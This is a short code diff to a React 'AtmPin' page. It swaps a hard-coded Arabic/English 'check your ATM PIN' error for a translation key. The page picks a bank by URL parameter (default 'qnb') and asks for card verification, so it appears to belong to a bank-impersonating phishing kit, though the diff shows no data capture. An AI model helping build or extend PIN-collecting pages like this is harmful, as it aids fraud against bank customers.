@@ -9,7 +9,7 @@ export default function AtmPin() {
   const search = useSearch();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
-  const { language, setLanguage } = useLanguage();
+  const { language, setLanguage, t } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
   const showError = params.get("error") === "true";
 
@@ -70,7 +70,7 @@ export default function AtmPin() {
         <div className="otp-box">
           {showError && (
             <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-              {isArabic ? "برجاء التحقق من رقم السري للصرف الي الصحيح" : "Please check the correct ATM PIN"}
+              {t("invalid_atm")}
             </div>
           )}
           <h2>التحقق من البطاقة</h2>
